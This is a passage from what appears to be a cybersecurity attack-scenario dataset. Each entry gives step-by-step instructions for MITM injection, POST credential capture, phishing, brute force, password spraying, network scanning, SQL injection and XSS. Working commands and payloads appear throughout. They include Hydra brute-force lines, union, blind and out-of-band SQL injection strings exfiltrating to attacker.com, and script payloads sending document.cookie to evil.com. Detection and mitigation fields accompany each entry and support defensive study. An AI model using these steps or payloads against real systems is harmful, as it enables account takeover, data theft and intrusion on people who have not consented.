Step 5: Victim unknowingly loads malicious JavaScript. Step 6: Script logs keystrokes or sends user actions to attacker server. Step 7: Can also inject fake forms to collect credentials. Step 8: Attack ends when victim disconnects or closes browser. Step 9: Only visible if user inspects page source or dev tools. Step 10: Common in open networks or poorly encrypted internal sites.
Vulnerability: Lack of HTTPS integrity, mixed content warnings
Detection Method: Use CSP headers and Subresource Integrity; monitor for inline script execution
Solution: Use HTTPS everywhere; enforce HSTS; block mixed content; implement CSP and security headers
Tags: MITM Injection, JS Abuse, Web Hijack

Title: Capture POST Data (Passwords)
Scenario Description: Attacker captures form submissions (like login forms) by intercepting POST requests in plain HTTP or through MITM.
Attack Steps: Step 1: Victim connects to insecure website (no HTTPS or using HTTP for login form). Step 2: Attacker performs MITM using ARP spoofing and Bettercap. Step 3: Runs Wireshark and applies filter: http.request.method == "POST". Step 4: Victim submits login form or sensitive info (email, password, credit card). Step 5: Attacker captures the POST body, which contains fields like username=user&password=pass123. Step 6: Extracts credentials and uses them to log into the victim's account or sell on dark web. Step 7: This also works with MITM proxies (like Burp Suite) that can strip SSL (if HSTS is not enforced). Step 8: Attack ends when victim disconnects or changes session. Step 9: No visual clues to victim unless browser shows warning. Step 10: Works best on legacy systems or misconfigured apps.
Detection Method: Monitor login attempts from new IPs; apply input logging protection
Solution: Enforce HTTPS on all forms; use secure authentication flows and validate transport security
Tags: HTTP POST, Form Hijack, Login Theft

Title: Fake Logout or Redirect to Capture Credentials
Scenario Description: Attacker tricks user into thinking they’re logged out and captures re-entered credentials via fake login screen.
Tools Used: Evilginx2, HTML clone tools, Burp Suite
Attack Steps: Step 1: Attacker sets up a phishing site that looks exactly like a legitimate login page (e.g., Outlook, Gmail, company portal). Step 2: Uses Evilginx2 or manually clones HTML using wget or HTTrack. Step 3: Hosts phishing site on https://secure-login-support.com (similar-looking domain). Step 4: Sends email or message claiming: “Your session expired, please log in again” with link to fake logout redirect. Step 5: Victim clicks, sees realistic login screen (but it’s attacker-controlled). Step 6: Enters credentials thinking they’re re-authenticating. Step 7: Form sends credentials to attacker’s server (e.g., via POST request to attacker endpoint). Step 8: Attacker captures and reuses credentials immediately or stores for later use. Step 9: Fake login page then redirects to real one or home page, reducing suspicion. Step 10: Detection is very hard unless email filters or URL inspection tools flag the phishing domain.
Vulnerability: User trust, phishing with similar domain
Detection Method: Look for mismatched domain referrers; use user-report phishing button
Solution: Implement logout with token invalidation; train users to check URLs; deploy browser-based URL filtering

Title: Brute Force Attack
Scenario Description: Attacker tries all possible combinations of passwords for a known username to gain unauthorized access.
Attack Steps: Step 1: Attacker identifies a login page (e.g., https://target.com/login). Step 2: Chooses a target username (admin, test@example.com, or guessed name). Step 3: Uses a tool like Hydra to send rapid requests with all combinations of common passwords (e.g., 000000, 123456, password1). Step 4: Example command: hydra -l admin -P /usr/share/wordlists/rockyou.txt https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" Step 5: Tool sends thousands of password guesses. Step 6: On correct guess, attacker gets successful login and access to system. Step 7: If the site lacks rate limits or lockout mechanisms, brute force is very effective. Step 8: Can also use Python scripts with requests library for smaller scale. Step 9: Detection depends on login monitoring and access anomalies. Step 10: Very noisy attack—can often be detected with logs.
Detection Method: Detect multiple login failures per IP or user
Solution: Enable account lockout, CAPTCHAs, use MFA

Title: Dictionary Attack
Scenario Description: Attacker uses a list of known weak passwords from leaks or wordlists to attempt login.
Tools Used: Hydra, Burp Suite, THC Hydra, Medusa
Attack Steps: Step 1: Attacker gathers a dictionary file (e.g., rockyou.txt, darkc0de.lst, SecLists). Step 2: Identifies a target system's login form or SSH/FTP server. Step 3: Executes tool like Hydra: hydra -l admin -P rockyou.txt ssh://target.com Step 4: The tool tries each password in the list. Step 5: If any password matches, login is successful. Step 6: Can also use Burp Intruder to test logins against web apps. Step 7: A match provides full access to target account. Step 8: Dictionary attacks are faster than brute force but depend on password list quality. Step 9: Easy to perform, even for beginners with Kali Linux. Step 10: Detection via unusual login attempts or password failure spike.
Detection Method: Monitor failed logins, user lockout, compare IP-to-login frequency
Solution: Ban weak passwords, enforce complexity, use login throttling

Title: Credential Stuffing
Scenario Description: Attacker uses leaked username-password pairs from previous data breaches to log in to multiple sites.
Attack Steps: Step 1: Attacker downloads or buys leaked credentials from dark web or paste sites (e.g., "email@example.com:password123"). Step 2: Prepares a "combo list" of email:password pairs. Step 3: Loads list into tool like Sentry MBA or OpenBullet with a configuration for the target website. Step 4: Tool automatically tests each pair on the login portal. Step 5: Successful logins are saved as "hits" and can be reused. Step 6: Attacker now has valid credentials without brute-forcing anything. Step 7: Can access user accounts on e-commerce, banking, or SaaS platforms. Step 8: Very hard to detect if credentials are correct. Step 9: Only way to stop is forcing password resets or MFA. Step 10: Often used for mass account takeovers and resale.
Detection Method: Alert on logins from unusual geolocations or device fingerprints
Solution: Use MFA, monitor for known leaked credentials, implement login anomaly detection

Title: Username Enumeration
Scenario Description: Attacker finds valid usernames by observing login error messages, API behavior, or timing differences.
Tools Used: Burp Suite, curl, Firefox Dev Tools
Attack Steps: Step 1: Attacker visits login or password reset form (e.g., “Forgot Password?” page). Step 2: Inputs random usernames (e.g., test1@example.com, admin@example.com) and observes error messages. Step 3: Notes that invalid users return “User not found” but valid ones return “Check your inbox” or “Password incorrect”. Step 4: Uses a list of common usernames/emails and automates testing via Burp Intruder or curl script. Step 5: Builds a list of valid usernames. Step 6: Can then be used for targeted phishing, brute-force, or credential stuffing. Step 7: Some sites leak this via registration (“This email already exists”). Step 8: Advanced method uses timing side-channels to detect valid users based on response delay. Step 9: Easy for beginners—can be done manually or with browser dev tools. Step 10: Critical first step in targeted attacks and password guessing.
Vulnerability: Different error messages for valid users
Impact: Setup for credential abuse and phishing
Detection Method: Detect unusual username lookup volumes, track failed login metrics
Solution: Respond with generic errors for all user lookups; rate-limit requests

Title: Parallel Multi-IP Attack
Scenario Description: Attackers use many different IP addresses in parallel to distribute brute-force attempts and bypass IP-based rate limiting or bans.
Tools Used: Hydra, custom Python scripts, proxy pools
Attack Steps: Step 1: Attacker prepares a list of IP addresses via rotating proxies, VPNs, or compromised hosts (botnet or cloud trials). Step 2: Loads target login URL (e.g., https://target.com/login). Step 3: Builds or uses a custom tool/script that dispatches login attempts using a different IP per request. Step 4: Common method is to split a password list across different proxies and execute in parallel. Step 5: Example using hydra: run multiple parallel Hydra sessions each bound to a different proxy IP. Step 6: If rate-limiting or bans occur by IP, they are distributed and ineffective. Step 7: If login success is detected by any client, attacker captures credentials. Step 8: This method is hard to detect unless the server performs session/user-level anomaly detection. Step 9: Often used in botnet-driven attacks or cloud-scaled brute-force operations. Step 10: Requires attackers to manage IP rotation or proxy pool handling using tools or Python (e.g., requests + proxies).
Detection Method: Detect excessive login attempts across users from distributed IPs
Solution: Apply user-based lockouts, CAPTCHA, behavior-based anomaly detection

Title: Tor or Proxy-Based Brute Force
Scenario Description: Attackers hide their real IP by routing brute-force attempts through Tor network or proxy chains, making attribution and blocking difficult.
Attack Steps: Step 1: Attacker configures system to route all traffic through Tor network using tools like proxychains or TorGhost. Step 2: Confirms Tor is working using curl ifconfig.me to verify IP rotation. Step 3: Starts brute-force attack against SSH, FTP, or login forms using a tool like Hydra. Step 4: Example command: proxychains hydra -l root -P rockyou.txt ssh://target.com Step 5: Tor changes exit nodes periodically, so each set of attempts comes from a new IP. Step 6: Makes IP-based bans ineffective because attacker’s IP keeps changing. Step 7: Especially effective on services with no CAPTCHA or detection system. Step 8: Repeat attack until access is gained or credentials guessed. Step 9: Often used to hide attacker identity or bypass geographic restrictions. Step 10: Can be very slow if not optimized, so often run over many hours or days.
Detection Method: Detect multiple failed logins from known Tor exit nodes or rotating proxies
Solution: Block Tor exit nodes, use MFA, enforce CAPTCHA or JavaScript challenges

Title: Exploit Weak Default Passwords
Scenario Description: Many systems (routers, IoT, VMs) come with factory default passwords like admin:admin. Attackers scan and try these defaults to gain access.
Attack Steps: Step 1: Attacker scans IP ranges (e.g., 192.168.0.0/24) with tools like nmap -p 22,23,80,443 --open to find live services. Step 2: Identifies service banners (e.g., "D-Link Router", "Apache Web Login", "Raspberry Pi") using nmap service detection or Shodan. Step 3: Searches default credentials (admin:admin, pi:raspberry) via Google or resources like default-password.info. Step 4: Tries logging in using SSH, Telnet, or Web UI with known credentials. Step 5: If login succeeds, attacker gets full control over device or system. Step 6: Often used on exposed IoT devices, dev systems, or misconfigured VMs. Step 7: Some devices expose credentials in public manuals. Step 8: Once inside, attacker may change settings, create persistence, or pivot deeper into the network. Step 9: This is one of the most common attack vectors for IoT botnets (like Mirai). Step 10: Mitigation is very simple—always change default passwords.
Detection Method: Audit for default logins, scan for open telnet/web interfaces
Solution: Enforce password change at first boot, use device management tools

Title: Attacks on Misconfigured SSH Ports
Scenario Description: Admins may move SSH to non-standard ports like 2222 or 22222, but forget to harden them. Attackers scan full port ranges to find them and attack anyway.
Attack Steps: Step 1: Attacker scans large IP ranges using nmap -p- or masscan to find non-standard open ports. Step 2: Identifies ports running SSH by banner grabbing or protocol testing. Step 3: Example: nmap returns "OpenSSH 8.2 on port 2222". Step 4: Loads brute-force tool like Hydra or Medusa and targets that port. Step 5: Example command: hydra -l root -P rockyou.txt ssh://target.com:2222 Step 6: Attempts login using common or leaked passwords. Step 7: If successful, gains shell access and can escalate privileges, install malware, or pivot. Step 8: Even if SSH is on a non-standard port, it's visible to determined attackers. Step 9: Port hiding is not a substitute for authentication security. Step 10: This attack works very well against dev/test systems left unprotected.
Vulnerability: SSH listening on unusual ports with weak auth
Detection Method: Monitor for scans or logins on uncommon ports, alert on brute force attempts
Solution: Use strong passwords, enforce key-based login, limit access by IP firewall

Title: Password Spraying
Scenario Description: Instead of brute-forcing one user with many passwords (which triggers lockouts), attacker uses one common password across many users.
Attack Steps: Step 1: Attacker compiles or discovers a list of known or guessed usernames (e.g., company emails: firstname.lastname@company.com). Step 2: Selects a very common password like Welcome@123, Summer2024, or Password1!. Step 3: Uses tools like CrackMapExec or custom Python scripts to try one login attempt per user to avoid account lockout. Step 4: Waits a period of time (e.g., 30 minutes, 1 hour) before the next round to avoid detection. Step 5: Continues this low-volume approach across time until one login attempt is successful. Step 6: Once access is gained, attacker explores internal systems using that user’s access. Step 7: Often used against OWA, VPN, RDP, SSO portals, and cloud apps (e.g., Office 365). Step 8: Particularly effective in enterprise environments where password policies are weak or recycled. Step 9: Very difficult to detect without user behavior analytics or rate-limiting per username. Step 10: Once attacker gets in, they may pivot, escalate, or maintain persistence via other methods.
Detection Method: Detect logins with same password across multiple accounts; monitor failed logins over time
Solution: Enforce strong password policies; MFA; rate-limit per user not just per IP
Tags: Login Abuse, Slow Brute Force, Password Guessing

Title: AI-Powered Smart Guessing
Scenario Description: AI models are trained on leaked password sets to generate realistic, user-specific password guesses based on patterns, names, or previous data breaches.
Attack Steps: Step 1: Attacker gathers leaked credential databases (e.g., from HaveIBeenPwned, RaidForums) or downloads publicly available breach corpuses. Step 2: Trains or fine-tunes an AI password generation model (e.g., PassGAN) on these corpuses to learn patterns of human password creation. Step 3: If targeting a specific person or company, attacker feeds in metadata (e.g., employee names, company name, birthdates, hobbies) to further personalize the password guesses. Step 4: The AI model then generates a ranked list of thousands to millions of likely passwords. Step 5: These passwords are used with automated login tools like Hydra, Burp Intruder, or browser automation to test credentials. Step 6: The success rate is significantly higher than standard brute force due to smart guessing logic. Step 7: Some attackers skip brute-force and instead generate passwords for phishing or account recovery manipulation. Step 8: When successful, attacker may silently access email, cloud storage, or VPN. Step 9: Detection is hard since AI passwords look human and don’t trigger traditional brute-force patterns. Step 10: Very new and powerful—especially dangerous against reused or weak password environments.
Detection Method: Hard to detect unless using behavior analytics or honeytokens
Solution: Use passphrases, force MFA, block breached passwords via known breach databases
Tags: AI, Smart Brute Force, Password Prediction

Title: Basic ICMP Sweep
Attack Type: Network Host Discovery via ICMP Echo
Scenario Description: A simple ping sweep sends ICMP Echo Requests to all IPs in a subnet to find active hosts.
Attack Steps: Step 1: Identify the target subnet range (e.g., 192.168.1.0/24). Step 2: Use command-line tool like fping -a -g 192.168.1.0 192.168.1.254 or nmap -sn 192.168.1.0/24. Step 3: These tools send ICMP Echo Requests ("ping") to every IP in the subnet. Step 4: Active hosts reply with ICMP Echo Replies. Step 5: The output shows which IPs are up (i.e., responding). Step 6: This is often the first step before a port scan or exploitation. Step 7: Easily detectable by basic intrusion detection systems (IDS) or firewalls. Step 8: Works best in internal networks or networks with permissive ICMP rules. Step 9: Common technique for reconnaissance by red teams and attackers.
Vulnerability: ICMP Echo Requests allowed by default
Detection Method: IDS/IPS monitoring of ICMP traffic; alert on mass ICMP ECHO packets
Solution: Rate-limit ICMP, disable unnecessary responses, or filter outbound ping replies

Title: Stealth Ping Sweep
Scenario Description: Instead of sending all ICMP requests quickly, attackers space them over time to evade logs, thresholds, or detection systems.
Attack Steps: Step 1: Identify the subnet range, e.g., 10.0.0.0/24. Step 2: Create a custom script or use tools like nmap with timing options. Step 3: Example: nmap -sn -T1 10.0.0.0/24 sends pings slowly using "Paranoid" mode. Step 4: Alternatively, a bash script can send one ping every few seconds: for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i; sleep 5; done. Step 5: This avoids triggering IDS systems that look for large bursts. Step 6: Useful in red team operations where stealth is more important than speed. Step 7: Results are collected over a longer period, but detection risk is reduced. Step 8: Harder to distinguish from legitimate network noise. Step 9: Once live hosts are found, attacker may proceed to more targeted scans.
Vulnerability: No thresholds set for low-rate ICMP scans
Detection Method: Monitor for persistent ICMP over long duration or from same IP at intervals
Solution: Implement behavioral anomaly detection, restrict ICMP from untrusted sources

Title: Fragmented ICMP Packets
Scenario Description: Attackers fragment ICMP packets to bypass basic firewalls or NIDS that don’t reassemble fragmented payloads.
Attack Steps: Step 1: Choose target IP or subnet (e.g., 192.168.100.0/24). Step 2: Use hping3 to send ICMP Echo Requests in fragmented format: hping3 -1 -f -c 1 192.168.100.1. Step 3: The -1 flag sets ICMP mode, and -f enables fragmentation. Step 4: This breaks the ICMP packet into multiple IP fragments. Step 5: Some firewalls and IDS do not properly reassemble these fragments, so they may not trigger alerts. Step 6: Target systems will reassemble and respond with ICMP Echo Reply if reachable. Step 7: Useful for bypassing simple or outdated intrusion detection systems. Step 8: May also help identify misconfigured filtering devices. Step 9: Must be used with care to avoid detection by advanced firewalls that do reassembly. Step 10: Can be logged if NIDS supports IP defragmentation modules (e.g., Snort).
Detection Method: Detect unusual fragmented packets or overlapping fragments
Solution: Use stateful packet inspection; enable fragmentation reassembly and deep packet inspection

Title: Spoofed Ping Sweep
Attack Type: Ping Sweep with Fake Source IP
Scenario Description: Attackers send ICMP Echo Requests with spoofed (fake) source IPs to mask their real location or cause asymmetric traffic.
Attack Steps: Step 1: Choose target subnet (e.g., 172.16.0.0/24). Step 2: Use hping3 or Scapy to craft ICMP Echo Requests with a spoofed source IP. Step 3: Example using hping3: hping3 -1 --spoof 8.8.8.8 172.16.0.1. Step 4: This makes the ICMP packet appear to come from Google DNS (8.8.8.8) or any other IP. Step 5: If the target responds, the ICMP Echo Reply is sent to the spoofed IP, not the attacker. Step 6: This can be used to map internal hosts without revealing attacker identity. Step 7: Can be combined with sniffing on the spoofed IP (e.g., ARP spoof to receive reply). Step 8: Also useful in reflection/amplification DDoS attacks. Step 9: Detection is harder because the true source IP is hidden. Step 10: Often used in red team stealth recon or obfuscated scanning attempts.
Vulnerability: ICMP Echo Requests with no IP validation
Detection Method: Monitor for mismatched MAC-IP or ICMP replies with unusual TTLs/delays
Solution: Ingress filtering (BCP 38), anti-spoofing rules, strict egress firewall controls

Title: Firewall Rule Testing
Attack Type: Identify Open Ports and Allowed Protocols
Scenario Description: Attackers probe target networks to test which firewall rules allow or block specific traffic types and directions.
Attack Steps: Step 1: Attacker identifies a list of target IPs or subnets. Step 2: Uses nmap with different port ranges and protocols: nmap -p 1-65535 -sS -Pn <IP> to test TCP SYN. Step 3: Uses nmap -sU to test UDP-based services like DNS, SNMP, etc. Step 4: Uses firewalk to determine firewall filtering behavior by sending packets with increasing TTL values and analyzing responses. Step 5: Tries telnet <IP> <port> or nc -vz <IP> <port> for quick manual port/protocol testing. Step 6: Uses hping3 to send custom TCP/UDP/ICMP packets to arbitrary ports and observe which responses come back (e.g., RST, ICMP unreachable, silence). Step 7: Collects all reachable ports/protocols as a "firewall rule baseline" for further exploitation. Step 8: Tests bi-directional traffic (inbound + outbound) from cloud instances or compromised internal hosts to test egress. Step 9: Identifies misconfigurations such as unrestricted outbound traffic or exposed internal admin ports. Step 10: Used heavily in both red team engagements and real attacks to bypass segmentation.
Vulnerability: Misconfigured or overly permissive firewall rules
Impact: Policy evasion, lateral movement path discovery
Detection Method: Alert on repeated connection attempts; look for port scan signatures, firewalk TTL patterns
Solution: Enforce least privilege in firewall rules; log denied connections; alert on scans and stealth probes

Title: Multiple Protocol Sweep
Scenario Description: Instead of just scanning TCP, attackers probe multiple protocols (TCP, UDP, ICMP, SCTP) to discover more open paths and bypass firewalls.
Attack Steps: Step 1: Attacker chooses a subnet or cloud IP range to target. Step 2: Uses nmap -sS -sU -sY -sN to test for TCP SYN, UDP, SCTP INIT, and TCP NULL scan across selected ports. Step 3: Runs masscan or zmap for high-speed sweeping of specific ports (e.g., 80, 443, 22, 3389, 3306, 53, 161). Step 4: Tests for open UDP ports like SNMP (161), DNS (53), NTP (123), TFTP (69) that firewalls may forget to filter. Step 5: Sends ICMP and custom protocol packets (e.g., SCTP INIT, GRE, IPsec) to detect if non-TCP protocols are allowed. Step 6: Logs all responses to identify live hosts and firewall behavior per protocol. Step 7: May chain this with port fingerprinting (nmap -A) to identify service types. Step 8: Used to discover open services for remote exploitation (e.g., RDP, SSH, DBs). Step 9: Valuable for red teamers to build a full map of what a firewall allows silently. Step 10: Often missed by SOCs if detection is tuned only for TCP scans.
Vulnerability: Firewall rules don’t filter or log all protocols
Detection Method: Alerts from IDS/IPS on uncommon protocol usage; correlate ICMP, SCTP, UDP traffic in recon patterns
Solution: Block unused protocols explicitly; implement default deny and allow by exception policy on firewalls

Title: Cloud/DMZ Exposure Mapping
Scenario Description: Attackers map publicly exposed services in cloud environments (e.g., EC2, Azure VMs, GCP Compute) and DMZ to identify entry points.
Attack Steps: Step 1: Attacker performs passive reconnaissance via services like Shodan, Censys, or Hunter.io to find target cloud infrastructure. Step 2: Collects known IP ranges of cloud providers or known DNS records (e.g., ec2-52-23-44-11.compute-1.amazonaws.com). Step 3: Uses Amass or Sublist3r to enumerate subdomains of the company. Step 4: Maps A/AAAA records to live IPs, often hosted on cloud services. Step 5: Uses nmap -Pn -sS -p- <ip> to perform full port scan on public cloud IPs. Step 6: Enumerates services like web portals (80/443), SSH (22), RDP (3389), DBs (3306/5432), Redis (6379), Elasticsearch (9200). Step 7: Compiles a list of accessible services that attackers could try to exploit (e.g., misconfigured S3, open Jenkins, exposed dashboards). Step 8: If DMZ is not properly segmented, attacker may also pivot inward. Step 9: Validates targets using banner grabbing, fingerprinting, or metadata. Step 10: Used to build a cloud attack surface map prior to real exploitation.
Impact: Entry point enumeration, lateral movement prep
Detection Method: Monitor cloud asset changes; use honeypots; alert on repeated port scans per cloud IP
Solution: Use CSPM tools; restrict public IP exposure; enforce zero trust access models for cloud and DMZ perimeter
Tags: Cloud Recon, Exposure Mapping, DMZ Mapping

Title: Union-based SQL Injection
Scenario Description: An attacker manipulates web app input fields to inject a malicious SQL UNION query that retrieves sensitive data from other database tables.
Tools Used: Burp Suite, sqlmap, browser, proxy, Firefox
Attack Steps: Step 1: Open the target web application in your browser and locate an input field that reflects user input in the URL (e.g., search, id=1). Step 2: Use a single quote (') to test if the field is vulnerable: modify the URL like https://example.com/page.php?id=1' and see if an SQL error is returned. Step 3: If an error appears (like "You have an error in your SQL syntax"), it indicates a possible SQL injection vulnerability. Step 4: Test the number of columns by appending ORDER BY clause: https://example.com/page.php?id=1 ORDER BY 1--, ORDER BY 2-- etc., until you get an error. The last number before the error shows how many columns exist. Step 5: Use the UNION SELECT statement to test output: try UNION SELECT 1,2,3-- replacing the number of columns from previous step. If the page reflects any numbers, you can inject data there. Step 6: Replace those numbers with database function calls like database(), version(), or table names: UNION SELECT database(), version(), user()--. Step 7: Enumerate table names using: UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema=database()--. Step 8: Enumerate column names with: UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users'--. Step 9: Dump data using: UNION SELECT username, password, null FROM users--. Step 10: For automation, use sqlmap tool: sqlmap -u "https://example.com/page.php?id=1" --dbs to list databases. Step 11: Use further sqlmap options: --tables -D dbname, --columns -T tablename, --dump to extract all data. Step 12: Always analyze the response for clues (errors, page behavior) and extract info slowly to avoid WAF detection. Step 13: This attack works when server includes unsanitized input directly into SQL statements, and UNION allows merging multiple SELECTs. Step 14: A successful exploit may reveal usernames, passwords, emails, credit card data or internal tables.
Vulnerability: Input not sanitized before SQL execution
Detection Method: Web app firewall logs; anomalous DB queries; unusual error messages
Solution: Use parameterized queries (e.g., prepared statements); validate and sanitize all user input
Tags: SQLi, Web Hacking, Database Injection, OWASP Top 10

Title: Error-Based SQL Injection
Scenario Description: Attacker manipulates input to cause SQL errors that reveal backend database info in error messages.
Attack Steps: Step 1: Find a web form (e.g., login, search) that sends input to the backend (e.g., GET /product.php?id=2). Step 2: Append a single quote (') to the input (e.g., id=2') and observe if the page throws a SQL error. Step 3: If error appears (e.g., "You have an error in your SQL syntax..."), it confirms vulnerability. Step 4: Start testing with UNION SELECT to retrieve additional data. For example, test with id=2 UNION SELECT NULL,NULL--. Step 5: Count how many columns exist by incrementing NULLs (e.g., NULL,NULL,NULL) until no error appears. Step 6: Replace NULLs with real values like database(), user(), version() to get DB details (e.g., id=2 UNION SELECT database(), user()--). Step 7: Extract table names using information_schema.tables, then column names. Step 8: Dump data using crafted UNION queries. Step 9: Exploit can be fully automated with tools like SQLmap.
Vulnerability: Verbose error messages in DB queries
Impact: Leak DB structure, user data, credentials
Detection Method: Monitor for SQL errors in responses; review logs showing quote or keyword injections
Solution: Sanitize input using parameterized queries; disable detailed DB errors in production

Title: Time-Based Blind SQL Injection
Scenario Description: No errors or outputs are shown, but response time reveals if injected query condition is true or false.
Attack Steps: Step 1: Find an input field that interacts with backend DB but shows no visible error (e.g., search box or login). Step 2: Inject ' OR IF(1=1, SLEEP(5), 0)-- into a field (e.g., URL parameter) and measure the response time. Step 3: If response is delayed by ~5 seconds, it confirms that the injected logic executed. Step 4: Now test false conditions (e.g., ' OR IF(1=2, SLEEP(5), 0)--) to confirm that delay doesn’t happen when false. Step 5: Use this technique to extract data one character at a time, such as checking if the first letter of the DB name is 'a' using: ' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--. Step 6: Automate character-by-character guessing using SQLmap with --technique=T or manually write a Python script with timing checks. Step 7: Iterate this logic to dump database names, table names, and values from key tables. Step 8: This is useful when error messages and content are suppressed but timing remains observable.
Vulnerability: No SQL errors, no visible output
Impact: Stealthy DB dump via time inference
Detection Method: Monitor response times and anomalies; alert on repeated delays in HTTP requests
Solution: Use prepared statements; set timeouts on DB responses; block usage of SLEEP or BENCHMARK in inputs
Tags: Blind SQLi, Time Delay, Inference Attack

Title: Boolean-Based Blind SQLi
Scenario Description: Input doesn’t show data or errors, but changes in page behavior reveal true/false logic evaluation.
Attack Steps: Step 1: Identify an input field that affects backend SQL query (e.g., URL like product.php?id=1). Step 2: Modify input to a condition like id=1 AND 1=1 and id=1 AND 1=2. Step 3: Observe differences in page behavior: when true (1=1), page loads normally; when false (1=2), page returns blank, error, or different content. Step 4: Use this logic to extract data from DB character by character. Example: test id=1 AND SUBSTRING(database(),1,1)='a' and observe output. Step 5: Use binary search or iterate through characters to discover DB name, table names, column names. Step 6: Build full queries to extract sensitive data (e.g., SELECT password FROM users WHERE id=1). Step 7: You can automate this using SQLmap with --technique=B. Step 8: Detection is difficult because no errors are shown — only logical flow is altered. Step 9: Great technique for hardened apps that block errors and verbose output.
Vulnerability: Suppressed errors but logic still executes
Detection Method: Monitor for repeated conditional requests; pattern-match SUBSTRING or CHAR usage in SQL queries
Solution: Input validation + whitelisting; use ORM; avoid direct SQL execution with raw input
Tags: Boolean SQLi, Blind Injection, Logic Abuse

Title: Out-of-Band SQL Injection
Scenario Description: Attacker forces DB to send data to an external server they control, bypassing app’s output filtering.
Attack Steps: Step 1: Attacker finds input that is used directly in SQL query but doesn’t reflect output or error in the browser. Step 2: Instead of extracting data via response, attacker uses DB functions like LOAD_FILE(), xp_dirtree, or UTL_HTTP.REQUEST() (depending on DBMS) to initiate external interaction. Step 3: For example, with MS-SQL, attacker sends: '; exec master..xp_dirtree '\\attacker.com\abc'--. If DBMS makes a DNS/SMB request to attacker.com, it proves code execution. Step 4: Use DNS logging tool (e.g., DNSBin or Burp Collaborator) to detect these callbacks. Step 5: Inject payloads to exfiltrate data (e.g., UNION SELECT password FROM users INTO OUTFILE '//attacker.com/data.txt'). Step 6: This works even if app doesn’t show SQL error/output as long as DB has outbound access. Step 7: SQLmap can automate this with --technique=U --os-shell --dns-domain=attacker.com. Step 8: Highly stealthy and dangerous on misconfigured DBs.
Impact: Full DB extraction via DNS/HTTP side channel
Detection Method: Monitor DNS/SMB/HTTP traffic from DB servers; watch for strange domains
Solution: Block outbound traffic from DB servers; disable risky functions like xp_cmdshell, UTL_HTTP
Tags: OOB SQLi, DNS Exfiltration, Advanced Threat

Title: Stored XSS
Attack Type: Inject JS stored in DB → auto-executes
Scenario Description: JavaScript payloads stored in DB render automatically when viewed by users.
Attack Steps: Step 1: Attacker finds an input field (e.g., comments, profile name, chat box) where the user input is saved and later displayed to other users. Step 2: Attacker inputs a malicious JavaScript payload such as <script>fetch('https://evil.com?cookie='+document.cookie)</script>. Step 3: This input is stored in the backend database. Step 4: When a victim or admin later views the page that renders this stored data, the malicious JS auto-executes. Step 5: The script may exfiltrate cookies, redirect to phishing pages, or alter UI. Step 6: Attacker can automate with multiple payloads targeting various pages or user roles. Step 7: The exploit is persistent and will trigger every time the page is viewed unless sanitized.
Detection Method: Monitor DB-stored inputs; observe DOM-based JS injections
Solution: Sanitize and encode stored user inputs on render

Title: Reflected XSS
Attack Type: JS injected in URL/query reflected back
Scenario Description: JavaScript payloads echoed immediately by server responses via URLs.
Attack Steps: Step 1: Attacker identifies a URL parameter (e.g., search?q=test) that is reflected in the page's HTML without proper encoding. Step 2: Attacker crafts a malicious URL like https://example.com/search?q=<script>alert('XSS')</script>. Step 3: The victim clicks on this crafted link (often sent via email or DM). Step 4: The server reflects the input back into the HTML page without sanitizing, executing the script in the victim’s browser. Step 5: This leads to credential theft, redirection, or arbitrary JS execution. Step 6: It only triggers when the crafted link is visited — hence non-persistent. Step 7: Reflected XSS can also affect search results, error messages, or UI labels.
Detection Method: Alert on suspicious URLs; use CSP headers
Solution: Escape reflected inputs; use HTML and JS encoding

Title: DOM-Based XSS
Attack Type: JS injected into DOM via client-side logic
Scenario Description: Client-side JS directly manipulates the DOM using untrusted input.
Attack Steps: Step 1: Attacker identifies DOM manipulation in JavaScript code that uses unsanitized data from sources like location.href, document.URL, or window.name. Step 2: Attacker crafts a URL such as https://example.com/#. Step 3: Victim visits the URL, and frontend JS inserts window.location.hash directly into innerHTML or a similar sink. Step 4: Malicious code executes in the user’s browser. Step 5: Since this attack bypasses the server, server-side filters offer no protection. Step 6: DOM-based XSS is stealthy and often missed in basic testing. Step 7: Attackers can chain this with phishing for greater impact.
Detection Method: Scan JS sinks and sources; analyze JavaScript logic
Solution: Sanitize DOM inputs; use secure JS APIs (e.g., textContent)

Title: XSS for Cookie Theft
Scenario Description: JavaScript accesses document.cookie and sends data to attacker.
Attack Steps: Step 1: Attacker first performs any XSS variant (stored, reflected, DOM) to execute JavaScript in the victim's browser. Step 2: Injects payload like <script>fetch('https://evil.com/log?c='+document.cookie)</script> into the vulnerable page. Step 3: When the script executes, the victim’s browser sends the session cookie to attacker’s server (evil.com). Step 4: Attacker now uses the stolen cookie to impersonate the victim on the target app. Step 5: This leads to session hijacking, data theft, or privilege abuse. Step 6: May be combined with other exploits (e.g., CSRF, privilege escalation). Step 7: Cookie theft is especially dangerous if HttpOnly is not set on sensitive cookies.
Vulnerability: No HttpOnly, vulnerable to JS access
Detection Method: Monitor outbound connections; alert on cookie string in GET/POST
Solution: Mark cookies as HttpOnly, use CSP and input validation
